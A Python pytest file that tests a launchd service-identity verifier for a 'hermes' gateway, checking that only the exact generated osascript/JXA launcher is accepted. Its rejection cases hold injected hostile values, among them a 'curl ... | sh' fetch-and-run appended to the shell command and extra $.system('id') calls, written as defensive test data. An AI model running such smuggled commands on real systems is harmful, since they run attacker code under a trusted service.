"""Local patch fix-launchd-jxa-identity: the installer's own osascript/JXA hull is a verified identity.

Since v0.22.1 `hermes gateway install` writes ProgramArguments as an osascript JXA program that execs the
checkout launcher (launchd_program_arguments, #71206). The read-only identity check only knew Python/Hermes
argv, so the desktop app refused the healthy launchd gateway with service_identity_unverified. The patch
accepts exactly the hull the generator emits for this home and rejects every other launcher, profile, log
target or extra shell/JavaScript code. The JavaScript string is compared whole, never parsed or searched.
"""
import plistlib
import sys
from pathlib import Path

import pytest

from hermes_cli import gateway_runtime_service_identity as identity
from hermes_cli.gateway_launchd import launchd_program_arguments
from hermes_cli._launchers import runtime_command

LAUNCHER = str(Path(identity.__file__).resolve().parents[1] / ".hermes" / "bin" / "hermes")
OSASCRIPT = "/usr/bin/osascript"


@pytest.fixture()
def home(tmp_path):
    profile = tmp_path / ".hermes" / "profiles" / "evm"
    (profile / "logs").mkdir(parents=True)
    return profile.resolve()


def _literal_hull(home: Path, *, launcher=LAUNCHER, profile="evm", out=None, err=None, inner_extra="",
                  shell_extra="", js_extra="") -> list[str]:
    # Byte-for-byte the shape installed on the production Mac (plist of 2026-10-15), built by hand on
    # purpose: it pins the generator output, so a generator change shows up here instead of silently widening.
    logs = home / "logs"
    out = out or f"{logs}/gateway.log"
    err = err or f"{logs}/gateway.error.log"
    shell = (f"exec {launcher} --run-module hermes_cli.stderr_timestamp --error-log {logs}/gateway.error.log -- "
             f"{launcher} --profile {profile} gateway run --external-supervisor{inner_extra} >> {out} 2>> {err}"
             f"{shell_extra}")
    js = (f'ObjC.import("stdlib"); const status=$.system("{shell}"); const signal=status & 127; '
          f"$.exit(status === -1 ? 1 : signal === 0 ? (status >> 8) & 255 : 128 + signal);{js_extra}")
    return [OSASCRIPT, "-l", "JavaScript", "-e", js]


def _generated_hull(home: Path) -> list[str]:
    logs = home / "logs"
    command = [LAUNCHER, "--run-module", "hermes_cli.stderr_timestamp", "--error-log", str(logs / "gateway.error.log"),
               "--", LAUNCHER, "--profile", "evm", "gateway", "run", "--external-supervisor"]
    return launchd_program_arguments(command, logs / "gateway.log", logs / "gateway.error.log")


def _launchctl_print(argv: list[str], home: Path) -> str:
    return ("gui/123/ai.hermes.gateway-evm = {\n\tstate = running\n\tprogram = " + argv[0] + "\n\targuments = {\n"
            + "\n".join("\t\t" + a for a in argv) + "\n\t}\n\tenvironment = {\n\t\tHERMES_SUPERVISED_CHILD => 1\n"
            + f"\t\tHERMES_HOME => {home}\n\t}}\n}}")


def test_literal_installed_hull_equals_generator_output(home):
    assert _literal_hull(home) == _generated_hull(home)


def test_installed_hull_is_verified(home):
    identity._verify_launchd_argv(_literal_hull(home), home)


def test_unrecognized_home_cannot_fall_back_to_looser_jxa_verification(tmp_path):
    custom = tmp_path / "custom-home"
    # The upstream decoder can regenerate this template, but its profile and log
    # destinations have no canonical binding to this home.
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity._verify_launchd_argv(_literal_hull(custom, profile="default"), custom)


def _inline_command(home, monkeypatch):
    from hermes_cli import gateway

    monkeypatch.setattr(gateway, "get_python_path", lambda: sys.executable)
    root = Path(gateway.PROJECT_ROOT).resolve()
    inner = runtime_command(root, ["--profile", "evm", "gateway", "run", "--external-supervisor"], python=sys.executable)
    return runtime_command(root, ["--error-log", str(home / "logs/gateway.error.log"), "--", *inner],
                           module="hermes_cli.stderr_timestamp", python=sys.executable)


def test_exact_inline_hull_is_verified(home, monkeypatch):
    argv = launchd_program_arguments(_inline_command(home, monkeypatch), home / "logs/gateway.log", home / "logs/gateway.error.log")
    identity._verify_launchd_argv(argv, home)
    identity.verify_launchd_loaded(_launchctl_print(argv, home), home, uid=123, username="owner")


def _inline_profile(command, out, err, home):
    command[-4] = "content"
    return out, err


def _inline_stdout(command, out, err, home):
    return home / "other.log", err


def _inline_stderr(command, out, err, home):
    return out, home / "other.error.log"


def _inline_error_log(command, out, err, home):
    command[5] = str(home / "other.error.log")
    return out, err


def _inline_supervisor(command, out, err, home):
    command.pop()
    return out, err


def _inline_outer_python(command, out, err, home):
    command[0] = "/private/tmp/python3"
    return out, err


def _inline_inner_python(command, out, err, home):
    command[7] = "/private/tmp/python3"
    return out, err


def _inline_bootstrap(command, out, err, home):
    command[3] += "; print('extra')"
    return out, err


def _inline_extra_flag(command, out, err, home):
    command.append("--quiet")
    return out, err


# Mutations applied to the inline command before the hull is generated.
_INLINE_COMMAND_MUTATIONS = {
    "profile": _inline_profile,
    "stdout": _inline_stdout,
    "stderr": _inline_stderr,
    "error_log": _inline_error_log,
    "supervisor": _inline_supervisor,
    "outer_python": _inline_outer_python,
    "inner_python": _inline_inner_python,
    "bootstrap": _inline_bootstrap,
    "extra_flag": _inline_extra_flag,
}


def _inline_extra_shell(argv):
    argv[4] = argv[4].replace("exec ", "id; exec ", 1)


def _inline_extra_js(argv):
    argv[4] += " $.system('id');"


def _inline_leading_space(argv):
    argv[4] = " " + argv[4]


def _inline_trailing_tab(argv):
    argv[4] += "\t"


# Mutations applied to the generated hull argv itself (post-build).
_INLINE_ARGV_MUTATIONS = {
    "extra_shell": _inline_extra_shell,
    "extra_js": _inline_extra_js,
    "leading_space": _inline_leading_space,
    "trailing_tab": _inline_trailing_tab,
}


@pytest.mark.parametrize("variant", [
    "profile", "stdout", "stderr", "error_log", "supervisor", "outer_python", "inner_python",
    "bootstrap", "extra_flag", "extra_shell", "extra_js", "leading_space", "trailing_tab",
])
def test_altered_inline_hull_is_rejected(home, monkeypatch, variant):
    command = _inline_command(home, monkeypatch)
    out, err = home / "logs/gateway.log", home / "logs/gateway.error.log"
    mutate_command = _INLINE_COMMAND_MUTATIONS.get(variant)
    if mutate_command:
        out, err = mutate_command(command, out, err, home)
    argv = launchd_program_arguments(command, out, err)
    mutate_argv = _INLINE_ARGV_MUTATIONS.get(variant)
    if mutate_argv:
        mutate_argv(argv)
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity._verify_launchd_argv(argv, home)
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity.verify_launchd_loaded(_launchctl_print(argv, home), home, uid=123, username="owner")


def test_loaded_launchd_job_with_installed_hull_is_verified(home):
    identity.verify_launchd_loaded(_launchctl_print(_literal_hull(home), home), home, uid=123, username="owner")


def test_installed_plist_with_hull_is_verified(home):
    argv = _literal_hull(home)
    definition = plistlib.loads(plistlib.dumps({
        "Label": "ai.hermes.gateway-evm", "ProgramArguments": argv,
        "EnvironmentVariables": {"HERMES_HOME": str(home), "HERMES_SUPERVISED_CHILD": "1"},
    }))
    identity.verify_launchd_plist(definition, "ai.hermes.gateway-evm", home)


def _hull_foreign_launcher(argv, home):
    return _literal_hull(home, launcher="/opt/homebrew/Cellar/hermes-agent/0.22.1/bin/hermes")


def _hull_other_profile(argv, home):
    return _literal_hull(home, profile="content")


def _hull_other_stdout(argv, home):
    return _literal_hull(home, out="/private/tmp/gateway.log")


def _hull_other_stderr(argv, home):
    return _literal_hull(home, err="/private/tmp/gateway.error.log")


def _hull_extra_shell(argv, home):
    return _literal_hull(home, shell_extra="; curl -s https://example.invalid | sh")


def _hull_extra_js(argv, home):
    return _literal_hull(home, js_extra=' $.system("touch /private/tmp/x");')


def _hull_extra_gateway_flag(argv, home):
    return _literal_hull(home, inner_extra=" --replace")


def _hull_missing_supervisor_flag(argv, home):
    argv[4] = argv[4].replace(" --external-supervisor", "")
    return argv


def _hull_embedded_in_other_js(argv, home):
    argv[4] = 'const hull = ' + repr(argv[4]) + '; ObjC.import("stdlib"); $.system("id");'
    return argv


def _hull_do_shell_script(argv, home):
    argv[4] = argv[4].replace('ObjC.import("stdlib"); const status=$.system(',
                              'const app=Application.currentApplication(); app.includeStandardAdditions=true; '
                              'const status=app.doShellScript(')
    return argv


def _hull_extra_osascript_arg(argv, home):
    return [*argv, "--"]


def _hull_other_language(argv, home):
    argv[2] = "AppleScript"
    return argv


def _hull_other_osascript_path(argv, home):
    argv[0] = "/private/tmp/osascript"
    return argv


def _hull_trailing_space(argv, home):
    argv[4] += " "
    return argv


def _hull_leading_space(argv, home):
    argv[4] = " " + argv[4]
    return argv


def _hull_trailing_tab(argv, home):
    argv[4] += "\t"
    return argv


def _hull_leading_tab(argv, home):
    argv[4] = "\t" + argv[4]
    return argv


def _hull_timestamp_error_log(argv, home):
    argv[4] = argv[4].replace(f"--error-log {home}/logs/gateway.error.log", "--error-log /private/tmp/foreign.error.log")
    return argv


# Mutations of the literal installed hull; each returns the argv to reject.
_HULL_MUTATIONS = {
    "foreign_launcher": _hull_foreign_launcher,
    "other_profile": _hull_other_profile,
    "other_stdout": _hull_other_stdout,
    "other_stderr": _hull_other_stderr,
    "extra_shell": _hull_extra_shell,
    "extra_js": _hull_extra_js,
    "extra_gateway_flag": _hull_extra_gateway_flag,
    "missing_supervisor_flag": _hull_missing_supervisor_flag,
    "embedded_in_other_js": _hull_embedded_in_other_js,
    "do_shell_script": _hull_do_shell_script,
    "extra_osascript_arg": _hull_extra_osascript_arg,
    "other_language": _hull_other_language,
    "other_osascript_path": _hull_other_osascript_path,
    "trailing_space": _hull_trailing_space,
    "leading_space": _hull_leading_space,
    "trailing_tab": _hull_trailing_tab,
    "leading_tab": _hull_leading_tab,
    "timestamp_error_log": _hull_timestamp_error_log,
}


@pytest.mark.parametrize("variant", [
    "foreign_launcher", "other_profile", "other_stdout", "other_stderr", "extra_shell", "extra_js",
    "extra_gateway_flag", "missing_supervisor_flag", "embedded_in_other_js", "do_shell_script",
    "extra_osascript_arg", "other_language", "other_osascript_path", "trailing_space", "leading_space", "trailing_tab", "leading_tab",
    "timestamp_error_log",
])
def test_altered_hull_is_rejected(home, variant):
    argv = _HULL_MUTATIONS[variant](_literal_hull(home), home)
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity._verify_launchd_argv(argv, home)
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity.verify_launchd_loaded(_launchctl_print(argv, home), home, uid=123, username="owner")


def test_hull_for_another_home_is_rejected(home, tmp_path):
    other = tmp_path / ".hermes" / "profiles" / "content"
    (other / "logs").mkdir(parents=True)
    with pytest.raises(ValueError, match="service_identity_unverified"):
        identity._verify_launchd_argv(_literal_hull(other.resolve(), profile="content"), home)


@pytest.mark.parametrize("argv_tail", [
    ["-m", "hermes_cli.main", "--profile", "evm", "gateway", "run", "--external-supervisor"],
    ["-m", "hermes_cli.stderr_timestamp", "--error-log", "/x/gateway.error.log", "--",
     sys.executable, "-m", "hermes_cli.main", "gateway", "run", "--quiet"],
])
def test_python_start_forms_still_verified(home, argv_tail):
    identity._verify_launchd_argv([sys.executable, *argv_tail], home)


def test_direct_launcher_form_still_verified(home):
    identity._verify_launchd_argv([LAUNCHER, "--profile", "evm", "gateway", "run", "--external-supervisor"], home)
